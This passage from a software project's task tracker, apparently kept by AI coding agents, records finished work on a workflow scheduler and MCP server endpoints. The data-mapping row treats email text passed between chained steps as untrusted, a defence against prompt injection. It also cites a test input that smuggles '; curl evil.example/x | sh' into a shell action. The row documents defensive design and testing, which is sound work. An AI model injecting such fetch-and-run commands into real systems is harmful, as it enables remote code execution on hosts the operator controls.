  **It rides a door that is already fetched.** `GET /api/tasks` returns `graph` beside `tasks`, and each task row gains `edges`. A fourth endpoint nothing fetches is a route with no caller, and `.pantheon/check-unreachable.py` measures it — **90 of a ceiling of 91** before this change, so one new unfetched route would have spent the entire remaining margin.
  **The depth cap had no name, no message and no way to find out it existed.** `_chain_refusal` (`:3148`) is the same walk with the reason kept: `cycle`, `too_deep` or `cross_owner`. `_has_chain_cycle` is kept with its old name and its old boolean for its three callers and two tests, and **nothing that was refused is now permitted**. What changed is that the run's own step log says which — `Did not continue to Nightly report: the chain is longer than 10 steps` — via `_record_chain_outcome` (`:1050`), which re-attaches the log after the run row has already been committed. Whoever built the workflow is not reading the server log; they are looking at a chain that stopped at step ten for no stated reason.
  **What the merge still needs (`static/**`, not in this patch):** nothing draws the graph. `P8-34` is the row for that and already declares `Depends: P8-26`; the payload it needs is on `GET /api/tasks` now — `graph.nodes`, `graph.edges` with a `when` per edge, `graph.conditions` and `graph.max_depth`.
  `Verify:` someone who has never opened Tasks chains eleven tasks together, runs the first, and can tell from the run itself that the chain stopped because it is too long — not that it "detected a cycle", and not nothing at all.
  `CI:` `tests/test_task_graph_document.py`. — agent:`p8b`
- [x] **P8-27** Run-scoped execution identity — the current one is keyed by task, so a task cannot be in flight twice. Required before fan-out. `Depends:` P8-26.
  — **done 2026-09-18, and the row's framing needs one correction.** The identity that was wrong is not `_executing` (which is keyed by task deliberately, and is what makes `run_task_now` return `False` and the webhook answer `409`); it is the **per-run state**, `_last_run_model` and `_last_run_steps`, which were single attributes on the scheduler. `B603` is the accurate statement of it and is closed by this row. **The "a task cannot be in flight twice" policy is unchanged** — widening it is a separate decision with a 409 and a double-dispatch guard behind it, filed as `B674` rather than changed in passing.
  `TaskScheduler._run_state` is a dict keyed by `run_id`, with `_state_for`, `_clear_run_state`, `run_steps`, `run_model`, `set_run_model` and `run_trigger`. `run_id` is threaded through `_execute_llm_task`, `_execute_research_task`, `_execute_checkin` and `_run_agent_loop`, and the slot is dropped in `_execute_task_locked`'s outermost `finally`, so a scheduler up for a week holds state for what is in flight and nothing else. `None` is a legitimate key, for the agent loop driven without a run row.
  **`B603`'s premises re-measured and all three held**: `TASK_CONCURRENCY_CAP_DEFAULT` is **1** and `TASK_CONCURRENCY_CAP_MAX` is **16**; `tests/test_task_shell_tools.py:114-119` is the `_run_agent_loop` stub, at exactly those lines, and it is updated. The defect reproduces on the pre-change tree: two interleaved runs, and run A is committed with **run B's model**.
  `Verify:` an operator who raises the concurrency cap to 4 runs four overlapping tasks, opens two of their histories, and each one reports the model it actually used and the tools it actually called — rather than the other run's.
  `CI:` `tests/test_run_scoped_execution_identity.py`. — agent:`p8b`
- [x] **P8-28** Branch node — the only conditional in the engine is `status == "success"`. `Depends:` P8-26.
  — **done 2026-09-18, premise exact.** `ScheduledTask.else_task_id` is the other branch, stored the same way `then_task_id` is and projected by the same `task_edges`, so `EDGE_CONDITIONS` is `('success', 'error')` and `EDGE_COLUMNS` is the one table saying which column carries which condition (`Law 7`). There is no edge table and no second place a successor can live.
  **`Law 20`, and the trap `P8-25` fell into is live for this row too.** `_migrate_add_scheduled_task_else_column` (`core/database.py:1521`) runs from `init_db`, and the test builds `scheduled_tasks` **by hand in its pre-column shape** rather than from the model — a migration test run against a schema `create_all` just built is a test of `create_all`. The `REFERENCES … ON DELETE SET NULL` clause is carried across in the `ALTER`, so a migrated database behaves like a fresh one instead of silently accepting a dead id; SQLite permits it because the new column defaults to NULL.
  **One thing found while doing it, and fixed here rather than filed.** The conditional was written inline after the run row was committed, so a task that **RETURNED** a failure reached it and a task that **RAISED** did not — the same failure, expressed two ways, taking two different paths through the workflow. `_advance_chain` (`src/task_scheduler.py:991`) is one function called from both. `skipped`, `aborted` and a deferred run take no edge at all, unchanged: they return before the branch.
  **What the merge still needs (`static/**`, not in this patch):** the form has no second picker. `static/js/tasks.js` has exactly one chain control — `#task-form-chain`, populated at `:1852` from `existing?.then_task_id` and posted as `payload.then_task_id` at `:1929`. It needs a sibling bound to `else_task_id`, labelled in consequences — *"if it fails, run…"* — and the task card's schedule line should say a task has a failure branch, or nobody will find out it exists. The API is complete: `TaskCreate`/`TaskUpdate` accept `else_task_id`, it is validated by the same `_validate_then_task_id` (same owner, no self-chain), and `_task_to_dict` serves it beside `edges`.
  `Verify:` someone who has never opened Tasks wires "if the nightly backup fails, message me", makes it fail, and the message task runs — without being told that a failure branch exists anywhere other than the form.
  `CI:` `tests/test_task_branch_node.py`. — agent:`p8b`
- [x] **P8-29** Data mapping between nodes. `Depends:` P8-23, P8-24.
  — **done 2026-09-19, premise exact and measured by driving it.** `_advance_chain`
  started the successor with `asyncio.create_task(self._run_chained(chain_id))` and
  `_run_chained` took an id and nothing else — driven on `d969b2e`, a chained run was
  handed `trigger=None` while its predecessor's result sat in a row nobody read. So a
  chain was a **sequence**: step two could not name what step one produced, and
  *"summarise my inbox, then email me the summary"* could not be built even though both
  halves shipped.
  **`Law 14`: the handoff is the channel `P8-23` already built, not a second one.** The
  predecessor's output arrives in the trigger envelope, through `build_trigger` with
  explicit `fields` — exactly how the webhook route declares its own keys, because *"a
  request body has no catalogue and its keys are fixed here instead"* and neither does
  "the step before this one". `TRIGGER_SOURCE_TASK` is a third source beside `event` and
  `webhook`; `TASK_HANDOFF_FIELDS` is its declaration, and a key nobody declared is
  dropped by the same code that drops an undeclared event field. One clip, one field cap,
  one envelope shape. The step log leads with **`Continued from <task>`** rather than
  *"Triggered by"*, which would read as the task triggering itself.
  **`P8-24`'s widened contract gets its first consumer.** `NodeResult.payload` is kept on
  the run's slot beside the model and the step log — where `P8-27` put a run's facts — so
  a node that returns a dict hands a dict on and the successor reads a field out of it
  *"without parsing English"*, which is the sentence `P8-24` wrote and nothing had yet
  used. When the payload **is** the text, as it is for all eighteen shipped actions, it
  is not repeated: the same string twice in a prompt is not data mapping.
  **The security decision, and it is the whole of this row's risk.** The payload is
  wrapped by `untrusted_context_message` with `provenance_origin="external"` and
  `arm_tool_gate=True`, the same as a webhook body. It is tempting to call a chain
  trusted because the **owner** built the wiring — but the wrapper is not about who built
  the wiring, it is about **who can choose the bytes**, and the step before this one can
  be `summarize_emails`. The first chain anybody builds is mail somebody else wrote
  arriving in a privileged run. Nothing is taken away (`Law 1`): the chain runs, the
  successor reads the payload, and only a privileged **effect** taken after reading it
  needs an approval the scheduled run cannot give — which it reports instead of taking.
  That is `FORBIDDEN.md` Part 2 working, kept rather than widened. **And the line this
  row must not cross:** the handoff is never an action's parameter. `_execute_action`
  builds its kwargs from `task.prompt` and from nothing else, a chained `ssh_command`
  gets its command from its own prompt, and a test drives a poisoned handoff
  (`; curl evil.example/x | sh`) through a chained `ssh_command` and asserts it appears
  in no kwarg — that mutant is the one to keep alive in any future refactor of this path.
  A predecessor that produced nothing hands on nothing, so every chain in every existing
  install still builds a byte-identical message list and still runs ungated.
  **What this is NOT, and the row's title oversells it.** *"Data mapping"* in a workflow
  tool usually means a person picking which field of step one fills which input of step
  two. **There is no picker and there is no per-field mapping**; what shipped is the
  whole payload arriving in one declared envelope, which is the thing that had to exist
  before a picker could mean anything. The picker is `static/**` plus a place to store
  the mapping, and it wants `P8-34`'s canvas beside it — recorded as `B806` rather than
  claimed here. A chained **action** successor still cannot consume the payload at all
  (see the paragraph above: deliberately), so today the handoff is useful to an `llm` or
  `research` successor and is a step-log line to an `action` one.
  `Verify:` someone who has never read this tracker builds "summarise my inbox" → "write
  me a note about it", runs the first one, and the second one's note is about **that**
  summary — and, opening the second run, can see on its first line which task handed it
  its input and what that input was.
  `CI:` `tests/test_a_chain_hands_on_what_it_made.py` (11 cases). `Depends:` P8-23,
  P8-24. — agent:`p8d`
- [x] **P8-30** Collapse the parallel event catalogues into one registry, and **add
  `document_updated`** — it is fired in production and appears in no catalogue, so nothing can
  trigger on it. **Re-measured 2026-09-18: not three catalogues but two enumerated ones plus
  seven loose strings**, two of them in `mcp_servers/email_server.py` — and `:1731` is the
  `document_updated` site, so the seventh spelling was the one the row is about. `src/event_bus.py`
  now holds `EVENT_CATALOGUE`, `EVENT_NAMES` and one `EVENT_*` constant per event; the count of
  spellings went from nine to one, the VALUES are byte-identical (`FORBIDDEN.md` Part 1), and
  `tests/test_event_catalogue.py` walks every `fire_event(...)` call site with `ast` rather than
  restating the list.
  — **client half closed 2026-09-18 (second wave), and the open half's premise was wrong in a way
  worth keeping.** It said *"the catalogue's `description` is not drawn anywhere"*. Measured
  against `1fe7c19`: `static/js/tasks.js:1550` drew
  `` opt.textContent = `${ev.name} — ${ev.description}` `` and had since commit `fff72ec`, well
  before this wave — the description **was** drawn, in the `<option>` label. The sentence also
  conflates two surfaces: `_scheduleLabel` (`:361-366`, both numbers correct) is the **task
  card's** schedule line, not the picker.
  What was actually wrong is narrower and worse: a `<select>` shows one option at a time and
  truncates it, the option led with the raw stored name, and once a choice was made nothing said
  what it meant. So the option now leads with English (`Document updated — Fires when an existing
  document is edited`, `title` carrying the stored name) and a `#task-form-event-desc` line under
  the select carries the chosen event's own sentence plus `Stored as document_updated`, re-read on
  `change` — a description that does not follow the selection describes a trigger the person just
  moved away from. The stored value is untouched everywhere: it is the `<option>`'s `value`, it is
  what goes into `ScheduledTask.trigger_event`, and a rename would disable every task using one.
  `_scheduleLabel` said `Every 1 document updated` and pluralised the verb at 2 — `P8-31` makes 1
  the common case, so it reads `On document updated` / `Every 5 × document updated` now.
  The picker's population moved out of `renderTriggerOpts` into `_populateEventPicker`, because a
  closure inside a closure inside a modal built from an `innerHTML` string cannot be called, and
  every claim about it would otherwise be a claim about its source text.
  `Verify:` someone who has never opened Tasks creates an automation that runs when a document is
  edited, finds the trigger in the picker without being told it exists, and can tell from the
  picker alone what will fire it — after choosing it, not only while scrolling past it.
  `CI:` `tests/test_event_catalogue.py` (server) ·
  `tests/test_the_palette_moves_to_the_server_js.py` (client). — agent:`p8auto` (server) /
  `p8ui2` (client)
- [x] **P8-31** Default a user-built automation's event count to 1. The UI defaults to 5; anyone
  arriving from a workflow tool expects every event.
  — **Premise corrected 2026-09-18. The server did not default to 5; it had no default and refused
  the request.** `POST /api/tasks` raised `400 "Trigger count is required for event-triggered
  tasks"` when the count was omitted, and the only reason nobody ever met that 400 is that
  `static/js/tasks.js:1541` pre-filled the field with `5` and `:1884` posted
  `parseInt(value || '5')`. Three answers to the same question, and the one the engine used —
  `task.trigger_count or 1` at the bus — was already the right one. `DEFAULT_TRIGGER_COUNT = 1`
  lives beside that bus, `POST /api/tasks` and `manage_tasks` apply it instead of refusing or
  writing a NULL, and it ships on `/meta/actions` as `default_trigger_count`. The value is
  **written into the row** rather than left null (`Law 10`).
  — **closed 2026-09-18 (second wave). Both fives re-measured at exactly the lines the row names**
  — `static/js/tasks.js:1541` and `:1884` at `1fe7c19` — and both are gone. The form and the
  payload call `_defaultTriggerCount()`, which is the served `default_trigger_count`; where the
  palette has not answered yet the field falls back to **1**, which is not a copy of the server's
  number but what the bus does with a NULL, and the field refreshes when `/meta/actions` lands
  unless the person has already typed in it. Same cache-buster bump as `P8-22`.
  **One thing this leaves crooked and `B614` records:** `default_trigger_count` is a fact about
  *triggers* riding on the *actions* endpoint, so the trigger form now fetches the action palette
  to learn a number that has nothing to do with actions.
  `Verify:` someone who has never opened Tasks builds "when a document is created, summarise it",
  does not touch the count field, and it runs on the next document — not the fifth.
  `CI:` `tests/test_the_palette_moves_to_the_server_js.py`. — agent:`p8auto` (server) / `p8ui2`
  (client)
- [x] **P8-32** Per-task timezone, retries, and a per-task timeout — none exist. Timezone today comes only via a crew member.
  — **done 2026-09-19. The premise is true and it understates the timezone half by five
  call sites.** `ScheduledTask` carried no `tz_name`, no retry setting and no timeout, and
  `_resolve_task_timezone` read the linked `CrewMember.timezone` and nothing else — all
  confirmed against `d969b2e`. What the row does not say is that **the crew member's zone
  reached one of the six places that compute a next run.** The executor passed it;
  create, edit, resume, bulk-resume and revert (`routes/task/task_routes.py`) all called
  `compute_next_run` with no `tz_name` at all. So a crew-member-linked daily task was
  *created* at the wrong time and stayed there until its first run corrected it, and an
  edit put it back. A sixth site disagreed in the other direction: `_task_period_seconds`
  passed `getattr(task, "tz_name", None)` — **a column that did not exist** — so the
  dispatch spread (`P15-10`) was always sized against a UTC period while the run itself
  was scheduled in the crew member's zone. Two answers to one question, and the wrong one
  chosen where nobody would look. All six now resolve through `_resolve_task_timezone`,
  whose order is **task → crew member → none** (`Law 7`). `valid_timezone` is the one
  function that decides which zones exist and the API refuses an unknown one, because
  `compute_next_run` swallows the `ZoneInfo` lookup error and falls back to naive UTC —
  so a typo is a task that runs every day at the wrong time with nothing anywhere saying
  so.
  **Retries reuse both ladders the row names and invent neither.** `P15-08`'s
  `failure_backoff_seconds` is the only backoff — same shape as `rate_limiter.penalise`,
  jittered through `src/jitter.py`, so `.pantheon/check-jitter.py` has nothing new to
  police and the checker still reports `PROBLEMS 0`. `apply_interval_floor` holds the
  minimum gap on top, because **a retry is one more request to the provider that has just
  refused us** and `FORBIDDEN.md` Part 2 is about exactly that standing; a test drives 25
  retries and asserts every one lands at or beyond the floor while still differing from
  each other. `P8-24`'s `retry_after` supplies the **unit** — the same number meaning the
  same thing — and what is deliberately **not** reused is `deferred` itself: `TaskDeferred`
  deletes the run row (`B675`), and a failure with retries left is the one case where the
  row is the entire point. The attempt count is `consecutive_failures`, read from
  `task_runs` rather than stored, for the reason `P15-08` already gave. `max_retries`
  NULL — every task in every existing install — computes byte-for-byte what this code
  computed before.
  **And it closed the half of `P15-08` that was never wired.** The backoff lived inside
  `except Exception`, so it covered a task that **raised** and not one whose action
  **returned** `(text, False)` — which is how every built-in email action reports
  failure, and those are the actions that get an owner soft-banned. Measured on `d969b2e`
  with a `*/5` cron task after five consecutive failures: **next run 5.0 minutes away**,
  at full cadence, against the thing already refusing it. After this row: **161.6
  minutes**, the ladder. `P8-28` fixed the same raised-versus-returned asymmetry for the
  failure *edge* and said so in those words; this is the other half, and
  `failure_next_run` is now the one place either shape is answered (`Law 14`).
  **The timeout is a ceiling on wall clock, and `error` not `aborted`.** `max_steps`
  bounds agent-loop *rounds* on an llm task and **nothing** bounded an action, so a hung
  action held a scheduler slot until the process restarted. `asyncio.wait_for` is applied
  at the one boundary rather than inside three executors, and only when a ceiling is set
  — a task with none never enters `wait_for` at all, which a test asserts, because an
  unbounded run is what every run has always been. `core/database.py` puts a user stop, a
  foreground takeover and a restart under `aborted` and calls them *"not a failure"*,
  because folding infrastructure into the error rate corrupts it; **a ceiling the owner
  set on this task is the opposite of infrastructure** — exceeding it is the task failing
  on the terms the owner gave it, so it counts, it backs off, and it takes the failure
  edge. It is caught explicitly rather than left to the `CancelledError` branch, which
  would have reported it as *"Stopped by user"*, and a `TimeoutError` raised from inside
  an executor's own `wait_for` is **re-raised** rather than claimed, because naming a
  limit the task does not have would print a ceiling of zero seconds.
  **`Law 20`: the migration is proved against a database created without the columns** —
  `scheduled_tasks` written out as it was, not derived from the model, which is the trap
  `P8-25` fell into. One migration for all three, and a half-migrated database gets the
  other two rather than erroring on the first.
  **What the merge still needs (`static/**`, not in this patch):** the task form has no
  input for any of the three. It needs a timezone select (the API refuses an invalid
  name, so a free-text box is acceptable and a select is better), a "retry a failed run N
  times" number bounded 0–10, and a "give up after N seconds" bounded 30–86400 — all
  three optional, all three meaning "no opinion" when blank, and the retry field needs one
  sentence saying the gap doubles each time because that is the part nobody can guess.
  `_task_to_dict` already ships all three. That is `B802`.
  `Verify:` someone who has never read this tracker sets a task to 09:00 in their own
  city and it runs at 09:00 there, not at 09:00 UTC — and a task that fails comes back on
  its own, a stated number of times, at gaps they were told about rather than at the same
  cadence that just failed.
  `CI:` `tests/test_a_task_says_when_and_how_long.py` (22 cases). `Depends:` P8-24,
  P15-08. — agent:`p8d`
- [x] **P8-33** A dry run that is actually dry. "Run now" is a real run with real side effects — no mocking, no pinned input, no per-node execution.
  — **done 2026-09-19, and the premise is exactly true.** Measured before touching
  anything: `grep -rn "dry" src/task_scheduler.py` returned **one** hit on the tree at
  `d969b2e` and it was the word "dry" inside an assistant persona string. `POST
  /api/tasks/{task_id}/run` went straight to `run_task_now` → `_execute_task` →
  `_execute_task_locked` → the executor, with no parameter anywhere that could hold it
  back. The button labelled as a test sent the email.
  **The obvious design is the trap, and it is eighteen of eighteen, not two.** Threading
  `dry_run=True` down to the action and letting each one honour it fails silently for
  every action that does not read the flag — and **all eighteen are `async def
  action_x(owner, **kwargs)`**, AST-counted from `BUILTIN_ACTIONS`'s own keys, so
  `**kwargs` swallows the flag and every one of them does the real thing while the
  surface says "dry". The row warns about two of eighteen; the design it warns about is
  wrong for all eighteen at once. So **a dry run does not call an action at all.**
  `_execute_task_locked` returns before any executor — above the foreground gate, above
  the run's flip to `running`, above delivery, notification and the chain — and
  `dry_run_plan` (`src/builtin_actions.py`) builds a plan by reading a registry. The
  guarantee is a `return`, which is a property a reader can check, and
  `tests/test_a_dry_run_is_dry.py` checks it the other way: it stubs each of the
  eighteen with a recorder and asserts the recorder is empty, eighteen times.
  **`Law 14`: `skipped`, not a seventh status.** `core/database.py` already defines
  `skipped` as *"deliberately did not run … Not a failure"*, which is the purest
  description of a dry run in the product. A new status would have to be taught to
  `check-run-statuses.py`, `static/js/runStatus.js`, `TASK_RUN_NOTIFY` and every consumer
  of the six to say what the sixth already says. `last_run`, `next_run` and `run_count`
  are untouched, nothing is delivered, nobody is notified and no chain advances — a dry
  run that moved the schedule would be a side effect on the one path whose whole promise
  is that it has none.
  **What "dry" can honestly mean, per action, declared in the registry `P8-22` built.**
  `BUILTIN_ACTION_META` gains `effects` (from a closed eight-value vocabulary) and `dry`
  (a three-value verdict, `Law 10`, because *"can this be dry run"* read as a boolean
  answers a different question from the one anyone is asking):
  `describes` · the plan names everything the real run would touch; what it cannot name
  is **scope** — how many sessions, which emails — because scope is live data and
  fetching it is the run. Thirteen actions.
  `shows-input` · the effect is a command **you** supplied, so Pantheon cannot say what
  it does; the plan shows the exact command and the exact host, verbatim, and says it
  cannot say more. `ssh_command`, `run_script`, `run_local`. This is the most useful dry
  run in the set: it is the one that shows you the argv before it reaches a production
  box. (`cookbook_serve` carries the same verdict for its JSON serve config.)
  `cannot` · **the two the row asks to be named, and they are two, arrived at by
  measurement rather than by the row's assertion.** `consolidate_memory`
  (`src/builtin_actions.py` — `mem["text"] = cleaned["text"]`) and `audit_skills`
  (`_apply_skill_md` puts a teacher model's rewrite on disk over your `SKILL.md`; `P8-10`
  added `versions/` precisely because that overwrite had no copy behind it). **The
  criterion, stated once so a nineteenth action can be judged against it: the real run
  replaces text the person wrote with text a model wrote, so the only report worth having
  — what the new text would say — needs the model call that is the expensive and
  irreversible half of the real run.** Nothing else in the eighteen qualifies, checked
  one at a time: `classify_events` sets metadata and leaves an already-classified event
  alone, `email_auto_translate` caches a translation **beside** the original, and
  `test_skills` is advisory by construction and says so in its own docstring.
  `DRY_UNCOVERABLE_ACTIONS` is **derived** from the `dry` verdicts rather than listed, so
  the answer cannot go stale, and the test asserts both its size and its membership.
  **No new route.** `dry=true` is a query parameter on the route that already exists.
  Two reasons, both load-bearing: a dry run and a real run are the same act with the same
  owner check, the same admin gate and the same `409`, so a second route would be a
  second place to keep those in step (`Law 14`); and `check-unreachable` is at **90 of
  90** (measured 2026-09-19, unchanged by this patch), so a new route with no `static/`
  caller fails the gate — and `static/` belongs to another agent this wave. The admin
  gate runs **before** the dry branch: a person without the privilege gets the same
  answer for a dry run as for a real one, which is the only answer that is not a
  privilege oracle.
  **What the merge still needs, and it is `static/**` so it is not in this patch.**
  (a) `static/js/tasks.js:164` builds `/run${force ? '?force=true' : ''}`; it needs a
  `Dry run` control beside `Run now` that appends `?dry=true`, labelled *"Show me what
  this would do"* rather than "Test". (b) `_renderRunSteps` (`static/js/tasks.js:2079`)
  maps every non-`tool` step to the literal word `progress`, so the plan's `kind:
  "dry-run"` steps draw their detail under a label that says "progress" — the same
  one-line branch `B670` already asks for, now with a second caller. Both are `B802`.
  `Verify:` someone who has never opened Tasks presses the control on a task that sends
  email, and no email is sent — and they are told, on the card, what the real run would
  have done and which two actions a dry run cannot tell them anything about.
  `CI:` `tests/test_a_dry_run_is_dry.py` (30 cases). `Depends:` P8-22, P8-24. — agent:`p8d`
- [x] **P8-34** The canvas, last, against a stable API. **Ship a Mermaid rendering of a workflow first** — it is already vendored and wired, works today, and needs no graph library. `Depends:` P8-22, P8-25, P8-26. — **done 2026-09-19, and the measurement that mattered was how little of the served graph anything read.** `GET /api/tasks` has answered `{tasks, graph}` since `P8-26`: `build_task_graph` (`src/task_scheduler.py:145`) puts `nodes`, `edges` with a `when` on each, the `conditions` vocabulary and `max_depth` on the wire, built from the same rows the list is built from, and `_task_to_dict` puts `then_task_id`, `else_task_id` and a per-task `edges` list on every row. **`static/` read none of it.** `_fetchTasks` (`static/js/tasks.js:58`) was `_tasks = data.tasks || []` and the graph went in the bin; `grep -rn "else_task_id" static/` returned **nothing at all**, and `then_task_id` appeared in exactly two places, both inside the edit form (`:1853` filling a `<select>`, `:1923` posting it back). So `P8-28`'s branch could be stored and never seen, and the only way to learn that finishing one task starts another was to open Edit on that task and read a dropdown.
  **`Law 14` first, as the row demands.** The renderer already exists and this is not a second one: `markdown.js:renderMermaid` (`:1035`) loads the vendored bundle on first use (`ensureMermaid`, `:90`), finds `pre.mermaid:not([data-processed])` in a container and calls `mermaid.run({nodes})`. `chatRenderer.js:3939`, `document.js:9831` and `slashCommands.js:476` already call it; `tasks.js` is the **fourth caller**. It emits the same `<div class="mermaid-container"><pre class="mermaid">` markup `markdown.js:690` emits for a fence in a chat message, and it does not load, initialise or configure Mermaid. The per-task view mechanism is `_showRunHistory`'s, reused exactly — module flag, replace `.modal-body`, `← Back` returns to `_renderMainView()` — rather than a second way of showing a per-task view in the same file.
  **What shipped.** `static/js/tasks/workflowDiagram.js` (new, 267 lines) is the graph half and is **pure** — no DOM, no fetch, no module state — so the test calls it directly with no sandbox and no stubs: `componentOf` (the connected component, walked **both** ways, because the thing a person most often needs is what runs *before* the task they opened), `longestChain`, `workflowMermaid`, `workflowSentence`, `mermaidText` and `themeDirective`. `tasks.js` keeps the words that belong to it — `_scheduleLabel` for the trigger and `_actionNode` for what an action does, off `P8-22`'s palette — and builds the view; duplicating either in the new module would be the `Law 13` shape this phase keeps finding. Reachable two ways: **Workflow** in the card's ⋮ menu beside History, and a chip under the meta line of any task in a chain — *"Part of a 3-step workflow"* — because a capability only in a kebab menu is what `P8-00` is a gate against.
  **Three decisions came from `P8-00` and not from taste.** (1) **No colour.** Sixteen palettes ship, Mermaid draws its own SVG, so a `classDef fill:#…` would be right in one theme and wrong in fifteen; every distinction is a shape (rectangle prompt / rounded research / hexagon action) or a word (`paused` written into the label), which also survives being printed. (2) **The trigger is in the box**, on entry nodes only — a downstream node is started by the arrow into it, and repeating its own schedule there would state something untrue. (3) **The arrows are sentences**: the wire's `success`/`error` stay stored and are drawn as `if it works` (solid) and `if it fails` (dotted). The served `max_depth` is shown for the first time too — a chain at 9 of 10 now says a further step would be refused, where before it looked exactly like a chain of two.
  `Verify:` someone who has never read this tracker opens Tasks, sees *"Part of a 3-step workflow"* under a task they did not write, clicks it, and can say out loud what the automation does — what starts it, what runs next when a step works, what runs instead when it fails, and which step is the one they were looking at — without opening Edit, reading `then_task_id`, or being told the chain exists.
  `CI:` `tests/test_a_workflow_you_did_not_write_js.py` (14 cases). The pure module is driven directly; the Mermaid text it produces is then handed to **the real vendored `static/lib/mermaid.min.js`** through `tests/harness/mermaid_diagram_parse.js`, which now takes extra cases as an argument, because no assertion written in a test can say whether Mermaid accepts something — only Mermaid can. The surface half runs through the shared `tasks.js` sandbox. Six mutations, all caught: dropping `data.graph` again, one arrow for both branches, removing the `"` case from `mermaidText`, putting the trigger on every node, a downstream-only component walk, and never calling `renderMermaid`.
  **The harness had to be repaired to do that, and what was wrong with it is the more useful finding.** DOMPurify — which the bundle carries and which mermaid runs every label through once the grammar has accepted it — returns an object with **no `sanitize`** unless `document.nodeType === 9`. The shim document had no `nodeType`, so every diagram with text in a node came back `ao.sanitize is not a function`. It passed its own three flowchart cases only because all of them (`graph TD; A-->B;`, `A@{ shape: person }`, `erDiagram`) have no node labels — i.e. **the harness had never parsed a diagram of the kind the product actually emits**. One line of shim; `broken` is still rejected, so nothing was loosened. — agent:`p8canvas`

### MCP Creator
- [x] **P8-35** **An update endpoint — the structural blocker. `PUT
  /api/mcp/servers/{server_id}`.** Measured before: of the eleven routes
  `setup_mcp_routes` registered, exactly one mutated a configured server —
  `PATCH /api/mcp/servers/{id}` (`routes/mcp/mcp_routes.py:357` at `HEAD`), whose only
  parameter is `is_enabled`. Changing a command, an argument, a URL or a token had no
  route at all. Both halves of the row's claim were reproduced by driving the existing
  routes (`tests/test_mcp_update_keeps_its_id.py::test_delete_then_add_mints_a_new_id_and_loses_the_disabled_list`):
  `DELETE` then `POST` returns a **different** id, because `add_server` opens with
  `str(uuid.uuid4())[:8]`, and the replacement row's `disabled_tools` is `NULL`. The
  second is worse than "orphaned" and the row understates it: `disabled_tools` is a
  column on the row, so deleting the row deletes the list, and **every tool the operator
  had hidden from the agent comes back enabled on the replacement** — a privilege change
  disguised as an edit, reported nowhere. The first is the orphaning the row names:
  `call_tool` splits `mcp__<server_id>__<tool>` and looks the id up in `self._sessions`,
  and `src/task_scheduler.py:2956` dispatches a scheduled task's `output_target` on
  exactly that prefix, so a task pointing at the old id stops delivering in silence.
  **The id-stability decision, written down: an id is an identity, not a version. An
  edit keeps it.** `PUT` mutates the row in place and will not touch two fields — `id`,
  so every stored `mcp__<id>__<tool>` keeps resolving, and `disabled_tools`, so a tool
  switched off stays off even when the command line under it changed completely (fail
  closed: an edit must not re-enable anything). The one thing an edit *can* invalidate is
  a tool NAME — point the command at a different package and the names change. Those
  entries are **kept** (pointing back must not have lost them) and returned as
  `stale_disabled_tools` so the operator learns it now rather than later; the response
  also carries `id_changed: false` so a client never has to guess.
  Fields left out are left alone; a field sent empty clears it — which has to be sayable,
  or a token can be rotated but never removed. Validation runs against the **merged** row,
  not against what was sent, so switching transport without the field the new one needs
  is refused instead of saved (`transport=http` with no stored `url` → 400, row
  unchanged). `_parsed_json_field` was a closure inside `add_server`; it is now module
  scope with two callers rather than two copies (`Law 13`), so both routes refuse
  malformed `args`/`env`/`oauth_config` with the same messages. An enabled server is
  disconnected and relaunched so the edit is visible now; a disabled one is edited and
  stays down, because an edit is not an enable. `require_admin`, same as `add_server` —
  the command runs on this host.
  `pantheon-mcp update` is the same decision at the shell, including the merged-row
  validation, and its output says in words that the running app has not reloaded and
  names the two ways to reconnect.
  `Verify:` an operator who typed the wrong path into a filesystem server fixes it with
  one `pantheon-mcp update <id> --args '[...]'`, calls a tool on it immediately, and
  finds their disabled-tool list and any scheduled task pointing at that server still
  working — where before they had to delete and re-add, and silently lost both.
  `CI:` `tests/test_mcp_update_keeps_its_id.py` (22 cases, drives the routes, including
  the delete-then-add reproduction of the premise and the `Law 1` case that `PATCH` still
  does only what it did), `tests/cli/test_mcp_cli_call_and_update.py` (edit-then-call
  against a real server). — agent:`p8core`
- [x] **P8-36** **Test-call endpoint — `POST /api/mcp/servers/{server_id}/call`.** Measured
  before: `setup_mcp_routes` registered **eleven** routes (`@router` decorators at
  `routes/mcp/mcp_routes.py:130, 168, 321, 357, 390, 408, 415, 435, 462, 516, 531` at
  `HEAD`) and **not one of them invoked a tool**. An operator could add a server,
  reconnect it, enable it, disable it, delete it and list what it offered, and the only
  way to find out whether any of it *worked* was to open a chat and hope the model chose
  the tool. The row's estimate was right about the shape: `McpManager.call_tool` was
  already public with a normalised `{stdout, stderr, exit_code}` envelope, so the missing
  piece was the door.
  Body is `{"tool": "<name>", "arguments": {...}, "timeout": <seconds>}`; the response
  carries the envelope plus `duration_ms`, `timed_out`, `image_count` and
  `tool_is_disabled`. It calls `mcp_manager.call_tool` — the same method
  `src/tool_execution.py:1345/1360` calls in an agent turn — so there is one call path,
  not a test path and a real path (`Law 14`). Three refusals, each naming which of three
  things is wrong rather than returning a tool error for a server that was never up: 404
  unknown server, **409** naming the state and the connect error when the server is not
  connected, 404 naming the tool and listing what the server does offer. `require_admin`
  and nothing else — it is a `FORBIDDEN.md` Part 2 control and this route adds no second
  gate. A tool on the server's `disabled_tools` list is still callable here (the list
  hides tools from the *model*, it is not a lock on the operator's own server) and the
  response says `tool_is_disabled: true` so a working test on a tool the agent never
  picks is not a mystery.
  **Reaching it unaided is `P8-00`, and the browser half is `static/**`, which this patch
  does not own.** So the unaided surface shipped here is the shell one: `pantheon-mcp`
  gains `call` and `tools`. Both connect to the server from the CLI's own process and
  disconnect again, so they work with the app stopped and need no token.
  Counts: `require_admin` sites 113 → **115** (direct 93 → 95), superuser 41 → **43**;
  `.pantheon/P11-AUTH-MAP.md` updated and `check-auth-map` re-derives it at PROBLEMS 0.
  `check-unreachable` is unaffected — `/api/mcp/` is an `ALLOWED` prefix
  (`.pantheon/check-unreachable.py:62`), so a new MCP route does not count against the
  90-route ceiling.
  `Verify:` someone who has never read this tracker runs `pantheon-mcp --help`, sees
  `call`, runs `pantheon-mcp tools <id>` to learn the tool names, then `pantheon-mcp call
  <id> echo --args '{"text":"hi"}'` and gets `"stdout": "echo: hi"` back — from a server
  they registered five minutes ago, without opening a chat and without reading any
  source.
  `CI:` `tests/test_mcp_test_call_endpoint.py` (28 cases, drives the endpoint function),
  `tests/cli/test_mcp_cli_call_and_update.py` (14 cases, spawns a real FastMCP stdio
  server and drives the CLI against it). `Depends:` P8-37, same change. — agent:`p8core`
- [x] **P8-37** **Add a timeout to the MCP call path — there was none, at any layer.**
  Measured before: `src/mcp_manager.py:510-512` at `HEAD` was
